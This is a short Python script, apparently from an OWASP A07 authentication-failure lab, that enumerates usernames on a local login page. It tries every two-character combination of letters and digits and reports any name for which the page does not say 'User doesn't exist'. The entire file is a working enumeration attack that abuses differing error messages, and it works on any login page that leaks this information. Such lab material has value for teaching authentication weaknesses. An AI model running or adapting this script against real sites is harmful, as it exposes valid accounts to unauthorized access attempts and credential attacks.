import requests
characters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
for a in characters:
  for b in characters:
    temp = requests.post('http://localhost/A07-authenticationFailure/login.php', data={'username': a+b, 'password': '123'})
    if "User doesn't exist" not in temp.text:
      print('Possible username: '+a+b)
